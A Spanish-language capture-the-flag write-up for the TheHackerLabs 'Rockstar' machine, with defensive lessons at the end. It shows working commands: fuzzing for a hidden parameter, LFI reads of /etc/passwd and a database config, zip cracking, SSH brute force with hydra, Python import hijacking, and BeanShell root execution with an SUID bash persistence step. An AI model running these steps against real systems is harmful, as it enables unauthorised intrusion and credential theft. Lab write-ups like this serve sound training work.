---
layout: post
title: "Rockstar - TheHackerLabs - Linux"
date: 2026-10-29
img: /assets/img/rockstar/banner.png
tags: 
- nmap
- ffuf
- gobuster
- curl
- ssh
- zip2john
- john
- hydra
- BeanShell
---

La máquina Rockstar expone una aplicación web en PHP vulnerable a Local File Inclusion (LFI) a través de un parámetro oculto (`backdoor`), descubierto mediante fuzzing de parámetros. La explotación del LFI permite leer credenciales hardcodeadas y obtener acceso inicial vía SSH. A partir de ahí, una cadena de escaladas de privilegios por abuso de sudoers (sobrescritura de binario, Python library hijacking, y BeanShell) lleva finalmente a una shell de root.

## Reconocimiento

Comenzamos con el reconocimiento al objetivo con nuestra herramienta Auto-Recon.py que nos ayuda a realizar este proceso de manera automatizada en los laboratorios.

![Reconocimiento](/secnotes/assets/img/rockstar/Pasted%20image%2020261030201020.png)

![escaneo directorios web](/secnotes/assets/img/rockstar/Pasted%20image%2020261030201040.png)

## Enumeración

A simple vista no tenemos nada, pero en pentesting web, cualquier comportamiento que se desvíe de lo normal es una señal de que hay lógica interesante detrás de eso..

En este caso `index.php            (Status: 500) [Size: 19]`

**Por qué?** 

Por que el error *500 (Internal Server Error)*, casi siempre significa que el script intentó usar una variable que no existe o un valor `null` donde esperaba "algo".

Cuando una aplicación web recibe datos del usuario, normalmente lo hace a través de **parámetros** con nombres específicos que el desarrollador definió en el código. Por ejemplo `$_POST['usuario']`, `$_GET['id']`, `$_POST['backdoor']`.

Nosotros, como atacantes, **no tenemos el código fuente**. Solo vemos lo que la aplicación nos deja ver desde afuera (caja negra). Si el formulario visible en el navegador no usa ese parámetro (porque es un parámetro “secreto” que el desarrollador dejó para debug, pruebas, o una funcionalidad oculta), nunca lo vamos a encontrar mirando el HTML ni el JS.

Entonces la pregunta es: **¿cómo encontramos el nombre de un parámetro que no se ve en ningún lado?**

La respuesta es fuerza bruta dirigida a nombres, no a contenido. Esto se llama **parameter discovery** o **parameter mining**.

Y luego de muchos intentos dimos con un resultado.


```bash 
┌──(yorve㉿SecNotes)-[~/Desktop]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt \
     -u "http://192.168.192.173/index.php" \
     -d "FUZZ=/etc/passwd" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -X POST \
     -fs 19
```

Los argumentos de este comando son:

`-u`: Cargamos un diccionario con nombres de parámetros que debemos encontrar
`-d`: "FUZZ" es el parámetro con el que la aplicación realizará las pruebas con el diccionario cargado
`-H`: Agregamos el header `Content-Type: application/x-www-form-urlencoded`, necesario para que el servidor interprete el body como datos de formulario correctamente y popule `$_POST` en PHP.
`-X`: El método a comprobar
`-fs 19`: Es el filtro para que oculte las respuestas cuyo tamaño en bytes es 19, dejando a la vista solo la anómala.

![Fuzz de parametros](/secnotes/assets/img/rockstar/Pasted%20image%2020261030201657.png)

Encontramos el parámetro oculto `backdoor`, lo probamos sobre la ruta `/etc/passwd` ya que este es un archivo recurrente en Linux.

Hasta el momento sabemos que el parámetro existe, pero no sabemos que hace. Probamos con `curl` para enviar una petición HTTP POST y validar si el servidor interpreta ese valor como una ruta de archivos a leer.

## Explotación

```bash
curl -X POST http://192.168.192.173/index.php --data "backdoor=/etc/passwd"
```

El resultado:
```bash
┌──(yorve㉿SecNotes)-[~/Desktop]
└─$ curl -X POST http://192.168.192.173/index.php --data "backdoor=/etc/passwd"
Yo no soy tu marido
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
shark:x:1001:1001:shark,,,:/home/shark:/bin/bash
wvverez:x:1002:1002:wvverez,,,:/home/wvverez:/bin/bash
loseey:x:1000:1000:loseey,,,:/home/loseey:/bin/bash
username3:x:1003:1003:usernam3,,,:/home/username3:/bin/bash
opensmtpd:x:102:110:OpenSMTPD Daemon,,,:/var/lib/opensmtpd/empty:/usr/sbin/nologin
opensmtpq:x:103:111:OpenSMTPD queue user,,,:/var/lib/opensmtpd/empty:/usr/sbin/nologin
Debian-exim:x:104:112::/var/spool/exim4:/usr/sbin/nologin
_lxd:x:105:113::/var/lib/lxd/:/bin/false
dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
```

Confirmamos el LFI, nuestro siguiente paso es leer el archivo de configuración de base de datos que esta dentro del servidor.

![directorios web encontrados](/secnotes/assets/img/rockstar/Pasted%20image%2020261030203050.png)

Aquí utilizamos la ruta absoluta `/var/www/html/db.php`, por que así le decimos exactamente donde está el archivo en todo el sistema de archivos, sin depender cuál sea el directorio de trabajo del proceso. Esta ruta siempre apuntará al mismo lugar.

Esto no fue al azar.
Ya habíamos confirmado con el header de Apache `Apache/2.4.62 (Debian)` que el sistema es Debian.
Normalmente en instalaciones estándar de Apache sobre Debian/Ubuntu, el `DocumentRoot` por defecto es `/var/www/html`, y ya sabíamos que `db.php` existe ahí. 

```bash
┌──(yorve㉿SecNotes)-[~/Desktop]
└─$ curl -X POST http://192.168.192.173/index.php --data "backdoor=/var/www/html/db.php"
Yo no soy tu marido<?php
$usuario = "shark";
$contrasena = "djbasdnbasdas&$AAAALLthl"; 
?>
```

Ya tenemos unas credenciales. Nuestro siguiente paso es ver si tenemos acceso vía SSH
```bash
shark@192.168.192.173's password: 
Linux TheHackersLabs-RockstarS 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64

           /^\/^\
         _|__|  O|
\/     /~     \_/ \
 \____|__________/  \
        \_______      \
                `\     \                 \
                  |     |                  \
                 /      /                    \
                /     /                       \\
              /      /                         \ \
             /     /                            \  \
           /     /             _----_            \   \
          /     /           _-~      ~-_         |   |
         (      (        _-~    _--_    ~-_     _/   |
          \      ~-____-~    _-~    ~-_    ~-_-~    /
            ~-_           _-~          ~-_       _-~
               ~--______-~                ~-___-~

Last login: Thu Mar 12 17:26:30 2026 from 192.168.91.191
shark@TheHackersLabs-RockstarS:~$ 

```

Y efectivamente pudimos entrar. AL ejecutar nuestro famoso `sudo -l`, podemos ver que tenemos permiso para ejecutar un archivo de un usuario llamado `wvverez` que esta en el directorio `/home/shark/bof`

![privilegios encontrados](/secnotes/assets/img/rockstar/Pasted%20image%2020261030215749.png)

Podemos utilizar `/home/shark/bof` como el usuario `wvverez`, sin necesidad de poner una contraseña (`NOPASSWD`).

## Escalada de Privilegios

```bash
shark@TheHackersLabs-RockstarS:~$ ls -la /home/shark/bof
-rwxr-xr-x 1 shark shark 7348 mar  8  2026 /home/shark/bof
shark@TheHackersLabs-RockstarS:~$ file /home/shark/bof  
/home/shark/bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
shark@TheHackersLabs-RockstarS:~$ 
```

No basta con que podamos ejecutar el binario como el usuario `wvverez`, necesitamos confirmar quien es el dueño del archivo y si tenemos permiso de escritura sobre él. Si es que el archivo nos pertenece, podemos cambiar su contenido sin necesidad de entender su lógica interna. 

Este archivo no es un script, es un binario ELF de nuestra propiedad (`shark`) con permisos de escritura.

Aprovecharemos esto para reemplazar su contenido por un script que nos entregue una shell.

Creamos una copia del binario. 

`cp /home/shark/bof /home/shark/bof.bak`

reemplazamos el contenido

`echo "bash" > /home/shark/bof`

y lo ejecutamos como el usuario `wvverez`

`sudo -u wvverez /home/shark/bof`

Al sobrescribir el archivo, este deja de ser ELF y pasa a ser un script de texto interpretable por la shell; sudoers solo valida la ruta permitida, no el contenido en si, por eso el cambio no invalida el permiso que teníamos.

![privilegios wvverez](/secnotes/assets/img/rockstar/Pasted%20image%2020261030220848.png)

Ya con este usuario revisamos nuestros permisos y si encontramos alguna información. 

```bash
wvverez@TheHackersLabs-RockstarS:/home$ cd wvverez/
wvverez@TheHackersLabs-RockstarS:~$ ls
rubiales.zip
wvverez@TheHackersLabs-RockstarS:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-RockstarS: Nombre o servicio desconocido
[sudo] contraseña para wvverez: 
```

Y lo único que tenemos es un archivo llamado `rubiales.zip`. Vamos a enviar este archivo a nuestra máquina atacante para verificarlo.

El método será:

`base64 -w 0 rubiales.zip`

copiamos la salida y en nuestra máquina 

`echo "<pega_el_base64>" | base64 -d > rubiales.zip`

**Que  hace?**

- **`base64`**: es una utilidad que convierte datos binarios (como un archivo `.zip`, que no es texto legible) en una representación de **texto plano** usando solo 64 caracteres seguros (letras, números, `+`, `/`, `=`). Esto es necesario porque vas a mover el contenido del archivo **copiando y pegando texto** entre dos terminales distintas (la de la víctima y la tuya en Kali) — no puedes copiar/pegar bytes binarios crudos de forma confiable en una terminal, pero sí texto.
- **`-w 0`**: por defecto, `base64` inserta un salto de línea cada 76 caracteres (para que quede “legible” en bloques). El flag `-w 0` (wrap = 0) le dice “no insertes ningún salto de línea, dame todo en una sola línea continua”. Esto es clave para que al copiar/pegar no se corte ni se desordene nada.
- **`rubiales.zip`**: el archivo que quieres convertir.

**En nuestra máquina**

Aquí `base64 -d` hace lo contrario: decodifica el texto de vuelta a los bytes binarios originales, y `> rubiales.zip` guarda ese resultado como un archivo zip nuevo en tu máquina.

![crackeo de contraseña zip](/secnotes/assets/img/rockstar/Pasted%20image%2020261030221718.png)

al intentar descomprimir el archivo este nos pide contraseña. Y como vimos con un lab anterior, podemos intentar crackearla con la herramienta `john` para obtener su contenido.

```bash
┌──(yorve㉿SecNotes)-[~/Desktop/rockstar]
└─$ zip2john rubiales.zip > rubiales.hash                         
ver 2.0 efh 5455 efh 7875 rubiales.zip/passwords.txt PKZIP Encr: TS_chk, cmplen=174, decmplen=295, crc=8E99C328 ts=8D21 cs=8d21 type=8
                                                                                                                                                                                           
┌──(yorve㉿SecNotes)-[~/Desktop/rockstar]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt rubiales.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                                                                           
┌──(yorve㉿SecNotes)-[~/Desktop/rockstar]
└─$ john --show rubiales.hash                                     
rubiales.zip/passwords.txt:princess:passwords.txt:rubiales.zip::rubiales.zip

1 password hash cracked, 0 left

```

Nos encontró la contraseña `princess`, al descomprimir el archivos con encontramos con un documento `passwords.txt`.

![unzip crackeado](/secnotes/assets/img/rockstar/Pasted%20image%2020261030222207.png)

```bash
┌──(yorve㉿SecNotes)-[~/Desktop/rockstar]
└─$ cat passwords.txt    
dadADASJNDAKNd1dadad
ajdjAsdaddiandas12313
kmdalskdmasdnmaskj126
djasndjasndjnasdjna12
dasdjnasjdknasdasd098
mkkdjasdasdasdasdada1
dasdjknadnasjdasjldas5
dkjandnkasndasjndjasd12
ldjnansdklnmasldasdd01
dljnasndkjasndjnasdja12
gjndkaskdasjdasndansdn
1dkjnandjkasndjasndjdd
djnasdnsadjnasldnaldn12
```

Ahora tenemos contraseñas y algunos usuarios confirmados en el sistema.

![usuarios encontrados](/secnotes/assets/img/rockstar/Pasted%20image%2020261030222328.png)

Por descarte solo nos queda `loseey y username3`, (`shark` y `wvverez` ya los usamos). Nos crearemos un diccionario pequeño con estos dos usuarios y utilizaremos el documento sobre `hydra` para obtener el pareo de credenciales.

```bash
┌──(yorve㉿SecNotes)-[~/Desktop/rockstar]
└─$ cat users.txt    
loseey
username3
```

```bash
┌──(yorve㉿SecNotes)-[~/Desktop/rockstar]
└─$ hydra -L users.txt -P passwords.txt ssh://192.168.192.173
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-30 20:26:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:2/p:13), ~2 tries per task
[DATA] attacking ssh://192.168.192.173:22/
[22][ssh] host: 192.168.192.173   login: loseey   password: kmdalskdmasdnmaskj126
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-30 20:26:28
```

Obtenemos nuevas credenciales. Esta vez para el usuario `loseey`

![](/secnotes/assets/img/rockstar/Pasted%20image%2020261030222806.png)

Ganamos acceso como este usuario, seguimos con el reconocimiento de privilegios e información de interés.

![](/secnotes/assets/img/rockstar/Pasted%20image%2020261030222933.png)

encontramos oro:

```bash
loseey@TheHackersLabs-RockstarS:~$ cat /home/loseey/rubiales.py
import psutil


def print_virtual_memory():
    vm = psutil.virtual_memory()
    print(f"Total: {vm.total} Available: {vm.available}")


if __name__ == "__main__":
    print_virtual_memory()
```

El script importa el modulo `psutil` (librería legítima de Python que sirve para consultar información del sistema). El problema no está en lo que el script hace explícitamente, sino que en como Python resuelve este import.

Como vimos en un lab anterior, cuando Python ejecuta un import, busca este módulo en una lista de directorios en un orden especifico y se detiene cuando encuentra la coincidencia. Esto significa que si creamos un archivo llamado `psutil.py` en el mismo directorio donde está `rubiales.py`, Python va a encontrar el archivo falso primero y lo va a importar en vez del original, sin errores y sin advertencias.

```bash
cd ~
echo 'import os; os.system("bash")' > psutil.py
sudo -u username3 /usr/bin/python3 /home/loseey/rubiales.py
```

Ejecutamos y obtenemos una shell como el usuario `username3`

![privilegios root](/secnotes/assets/img/rockstar/Pasted%20image%2020261030223751.png)

Con este nuevo usuario volvemos a la enumeración de privilegios.

```bash
username3@TheHackersLabs-RockstarS:/home/loseey$ sudo -l
sudo: unable to resolve host TheHackersLabs-RockstarS: Nombre o servicio desconocido
Matching Defaults entries for username3 on TheHackersLabs-RockstarS:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User username3 may run the following commands on TheHackersLabs-RockstarS:
    (root) NOPASSWD: /usr/bin/bsh
username3@TheHackersLabs-RockstarS:/home/loseey$ 
```

Y tenemos permiso para ejecutar `/usr/bin/bsh`

**Que es `bsh`?**

[Wikipedia bsh](https://en.wikipedia.org/wiki/BeanShell)

***BeanShell** es un intérprete de código fuente Java pequeño, gratuito e integrable con funciones de lenguaje de programación orientado a objetos, escrito en [Java](https://en.wikipedia.org/wiki/Java_\(programming_language\) "Java (programming language)"). Se ejecuta en la máquina virtual Java (JVM), también llamada Java Runtime Environment (JRE), ejecuta dinámicamente la sintaxis estándar [de Java](https://en.wikipedia.org/wiki/Java_syntax "Java syntax") y la extiende con comodidades de scripting comunes, como tipos sueltos, comandos y cierres de métodos, como los de [Perl](https://en.wikipedia.org/wiki/Perl "Perl") y [JavaScript](https://en.wikipedia.org/wiki/JavaScript "JavaScript"). Es [un software gratuito y de código abierto](https://en.wikipedia.org/wiki/Free_and_open-source_software "Free and open-source software") lanzado con una [licencia Apache](https://en.wikipedia.org/wiki/Apache_License "Apache License") 2.0 desde BeanShell 2.0b5.*


Ejecutamos `bsh`

```bash
username3@TheHackersLabs-RockstarS:/home/loseey$ sudo /usr/bin/bsh
sudo: unable to resolve host TheHackersLabs-RockstarS: Nombre o servicio desconocido
BeanShell 2.0b4 - by Pat Niemeyer (pat@pat.net)
bsh % 
```

```bash
bsh % exec("id");
uid=0(root) gid=0(root) grupos=0(root)
bsh % 
```

Confirmamos que tenemos ejecución como `root` dentro de `BeanShell`. Nuestro siguiente paso es dejar una vía de acceso persistente y más cómoda para trabajar.

`exec("chmod +s /bin/bash");`

Agregamos el bit SUID al binario de `/bin/bash`. Esto significa que de aquí en adelante cualquier usuario que ejecute este binario, correrá con privilegios del dueño (root).

Luego salimos de `bsh` y lanzamos nuestra nueva shell con `bash -p`.

```bash
username3@TheHackersLabs-RockstarS:/home/loseey$ bash -p
bash-5.2# whoami
root
bash-5.2# 
```

Y finalmente nos convertimos en usuario `root` 😮‍💨

## Lecciones Aprendidas
- **Saneamiento en aplicaciones web:** Nunca se debe pasar input del usuario directamente a funciones de lectura/inclusión de archivos sin validar y restringir las rutas permitidas (whitelisting, rechazo de rutas absolutas y secuencias `../`).
- **Gestión de credenciales y contraseñas:** Las credenciales no deben estar hardcodeadas en el código fuente; deben gestionarse mediante variables de entorno o gestores de secretos.
- **Principio de menor privilegio:** Las reglas de sudoers deben restringirse al máximo (evitar permitir binarios/intérpretes completos sin restricción de argumentos), ya que un intérprete o binario con permiso de escritura, o sin restricción de comandos, equivale a una escalada completa.

## Herramientas Usadas
- `nmap` `ffuf` `gobuster` `curl` `ssh` `zip2john` `john` `hydra` `BeanShell`
